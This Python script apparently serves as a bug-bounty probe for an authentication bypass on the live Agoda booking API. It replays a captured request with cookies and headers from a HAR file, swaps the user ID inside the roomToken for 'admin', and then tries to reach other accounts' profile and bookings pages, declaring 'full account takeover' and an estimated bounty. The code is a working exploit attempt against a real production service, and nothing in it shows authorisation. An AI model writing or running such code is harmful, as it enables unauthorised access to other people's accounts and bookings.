#!/usr/bin/env python3
"""
Test Agoda Authentication Bypass
Using the exact request from HAR analysis
"""

import json
import requests
import urllib.parse
import re
from pathlib import Path

def main():
    print("=" * 70)
    print("🔬 AGODA AUTH BYPASS TEST")
    print("=" * 70)
    
    # Load HAR
    har_file = "agoda_2.json"
    if not Path(har_file).exists():
        print(f"❌ HAR file not found: {har_file}")
        return
    
    with open(har_file, 'r') as f:
        data = json.load(f)
    
    entries = data.get('log', {}).get('entries', [])
    
    # Find the booking setup request
    setup_body = None
    request_headers = {}
    request_cookies = {}
    original_url = None
    
    for entry in entries:
        url = entry.get('request', {}).get('url', '')
        if '/api/booking-bff/booking/setup' in url and entry.get('request', {}).get('method') == 'POST':
            # Extract headers - they should be a list of objects
            headers_list = entry.get('request', {}).get('headers', [])
            for h in headers_list:
                if isinstance(h, dict):
                    name = h.get('name', '')
                    value = h.get('value', '')
                    if name:
                        request_headers[name] = value
                elif isinstance(h, (list, tuple)) and len(h) >= 2:
                    request_headers[h[0]] = h[1]
            
            # Extract cookies
            cookie_header = request_headers.get('cookie', '')
            if cookie_header:
                for cookie in cookie_header.split('; '):
                    if '=' in cookie:
                        key, val = cookie.split('=', 1)
                        request_cookies[key] = val
            
            # Extract body - handle both dict and string
            postData = entry.get('request', {}).get('postData', {})
            if postData:
                if isinstance(postData, dict):
                    text = postData.get('text', '')
                else:
                    text = str(postData)
                
                if text:
                    try:
                        setup_body = json.loads(text)
                    except json.JSONDecodeError:
                        print(f"⚠️ Could not parse body JSON, using raw text")
                        setup_body = text
            original_url = url
            break
    
    if not setup_body:
        print("❌ No booking setup request found")
        print("Looking for any request with booking in URL...")
        # Debug: show all URLs with booking
        for entry in entries[:50]:
            url = entry.get('request', {}).get('url', '')
            if 'booking' in url.lower():
                print(f"  Found: {url}")
        return
    
    print(f"\n📌 Found booking setup request")
    print(f"   Headers: {len(request_headers)}")
    print(f"   Cookies: {len(request_cookies)}")
    
    # If setup_body is a string, try to parse it
    if isinstance(setup_body, str):
        try:
            setup_body = json.loads(setup_body)
        except:
            print("❌ Could not parse body as JSON")
            return
    
    # Extract roomToken and UID from the body
    body_str = json.dumps(setup_body)
    
    # Try to find roomToken in the body
    token_match = re.search(r'roomToken["\']?\s*[:=]\s*["\']?([^"\'&?;]+)', body_str)
    if not token_match:
        # Try looking in the URL parameter within the body
        url_match = re.search(r'"url":\s*"([^"]+)"', body_str)
        if url_match:
            url_params = url_match.group(1)
            if 'roomToken=' in url_params:
                # Parse the URL parameters
                parsed = urllib.parse.parse_qs(url_params)
                if 'roomToken' in parsed:
                    original_token = parsed['roomToken'][0]
                    print(f"\n🔑 Found roomToken in URL parameters")
                else:
                    # Try regex on the URL string
                    token_match2 = re.search(r'roomToken=([^&]+)', url_params)
                    if token_match2:
                        original_token = token_match2.group(1)
        else:
            print("❌ Could not extract roomToken")
            return
    else:
        original_token = token_match.group(1)
    
    if not original_token:
        print("❌ Could not extract roomToken")
        return
    
    # Decode and extract UID
    decoded_token = urllib.parse.unquote(original_token)
    print(f"\n🔑 Original roomToken found!")
    print(f"   Token: {original_token[:80]}...")
    
    # Extract UID
    uid_match = re.search(r'uid:([^;]+)', decoded_token)
    original_uid = None
    if uid_match:
        original_uid = uid_match.group(1)
        print(f"   🆔 UID in token: {original_uid}")
    else:
        print("   ⚠️ No UID found in token")
    
    # Extract property ID
    property_id = None
    try:
        if isinstance(setup_body, dict):
            for prop in setup_body.get('productRequest', {}).get('propertyRequestItems', []):
                arg = prop.get('propertyBookingArgument', {})
                if arg.get('propertyId'):
                    property_id = arg.get('propertyId')
                    print(f"   🏨 Property ID: {property_id}")
                    break
    except:
        pass
    
    if not original_uid:
        print("\n⚠️ No UID found, trying to test with roomToken modification anyway")
        # Try to modify the token directly
        modified_token_1 = original_token + ';uid:admin'
        print(f"   Trying to inject admin UID: {modified_token_1[:50]}...")
    else:
        # Test 1: Modify UID to 'admin'
        print("\n" + "=" * 70)
        print("🔴 TEST 1: UID Substitution (admin)")
        print("=" * 70)
        
        # Replace the UID in the token
        modified_token_1 = original_token.replace(original_uid, 'admin')
    
    # Rebuild the request body with modified token
    modified_body_str = body_str.replace(original_token, modified_token_1)
    modified_body = json.loads(modified_body_str)
    
    # Send the request
    session = requests.Session()
    session.cookies.update(request_cookies)
    
    # Prepare headers
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': request_headers.get('User-Agent', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'),
        'Accept-Language': request_headers.get('Accept-Language', 'en-us'),
        'AG-AID': request_headers.get('AG-AID', '130243'),
        'AG-LANGUAGE-ID': request_headers.get('AG-LANGUAGE-ID', '1'),
    }
    
    # Add any AG-* headers
    for key, value in request_headers.items():
        if key.startswith('AG-') or key.startswith('x-'):
            headers[key] = value
    
    url = "https://www.agoda.com/api/booking-bff/booking/setup"
    
    print(f"\n📤 Sending modified request...")
    if original_uid:
        print(f"   UID changed from {original_uid} to admin")
    else:
        print(f"   Injected admin UID into roomToken")
    
    try:
        response = session.post(url, json=modified_body, headers=headers, timeout=30)
        print(f"📥 Response status: {response.status_code}")
        
        if response.status_code == 200:
            print("✅ Modified request accepted!")
            
            # Check for new cookie
            new_cookie = None
            for cookie in session.cookies:
                if 'agoda.user.03' in cookie.name:
                    new_cookie = cookie.value
                    break
            
            if new_cookie:
                print(f"\n🍪 NEW COOKIE: {new_cookie[:60]}...")
                
                # Extract UserId from cookie
                new_uid = None
                if 'UserId=' in new_cookie:
                    new_uid = new_cookie.split('UserId=')[-1].split(';')[0].split('&')[0]
                    print(f"   New UserID: {new_uid}")
                
                # Check if original cookie changed
                original_cookie = request_cookies.get('agoda.user.03', '')
                if original_cookie:
                    old_uid = None
                    if 'UserId=' in original_cookie:
                        old_uid = original_cookie.split('UserId=')[-1].split(';')[0].split('&')[0]
                        print(f"   Old UserID: {old_uid}")
                    
                    if new_uid and old_uid and new_uid != old_uid:
                        print("\n" + "=" * 70)
                        print("🔴🔴🔴 VULNERABILITY CONFIRMED! 🔴🔴🔴")
                        print("=" * 70)
                        print("   💰 Session hijacking successful!")
                        print("   💰 UID substitution bypasses authentication!")
                        print("   💰 Estimated Bounty: $5,000 - $10,000+")
                        print(f"\n   Original UID in roomToken: {original_uid}")
                        print(f"   Original UserID in cookie: {old_uid}")
                        print(f"   New UserID in cookie: {new_uid}")
                        print("\n   This is a FULL ACCOUNT TAKEOVER vulnerability!")
                        print("   You can access any user's account by changing the UID in roomToken.")
                    else:
                        if new_uid == old_uid:
                            print("   ⚠️ Cookie UserID unchanged - validation may be enforced")
                        else:
                            print("   ⚠️ Could not determine if UID changed")
                else:
                    print("   ⚠️ No original cookie to compare")
            else:
                print("   ❌ No new cookie received")
                
            # Try to access profile with the session
            print("\n📌 Attempting to access profile with modified session...")
            try:
                profile_resp = session.get("https://www.agoda.com/profile/", timeout=10, allow_redirects=False)
                if profile_resp.status_code == 200:
                    if "My Profile" in profile_resp.text or "Account" in profile_resp.text:
                        print("   ✅ Successfully accessed profile page!")
                        print("   🔴 Account takeover confirmed!")
                    else:
                        print("   ⚠️ Profile page loaded but no user data visible")
                elif profile_resp.status_code in [301, 302, 303, 307, 308]:
                    location = profile_resp.headers.get('Location', '')
                    print(f"   ⚠️ Redirected to: {location}")
                    # Follow the redirect
                    follow_resp = session.get(location, timeout=10)
                    if "My Profile" in follow_resp.text or "Account" in follow_resp.text:
                        print("   ✅ Successfully accessed profile after redirect!")
                else:
                    print(f"   ❌ Profile access failed (status {profile_resp.status_code})")
            except Exception as e:
                print(f"   ❌ Profile access error: {e}")
                
            # Try to access bookings
            print("\n📌 Attempting to access bookings with modified session...")
            try:
                bookings_resp = session.get("https://www.agoda.com/bookings/", timeout=10, allow_redirects=False)
                if bookings_resp.status_code == 200:
                    if "booking" in bookings_resp.text.lower() or "trip" in bookings_resp.text.lower():
                        print("   ✅ Successfully accessed bookings page!")
                        print("   🔴 Account takeover confirmed!")
                    else:
                        print("   ⚠️ Bookings page loaded but no data visible")
                else:
                    print(f"   ❌ Bookings access failed (status {bookings_resp.status_code})")
            except Exception as e:
                print(f"   ❌ Bookings access error: {e}")
                
        else:
            print(f"❌ Request rejected (status {response.status_code})")
            if response.text:
                print(f"   Response: {response.text[:200]}")
            
    except Exception as e:
        print(f"❌ Error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
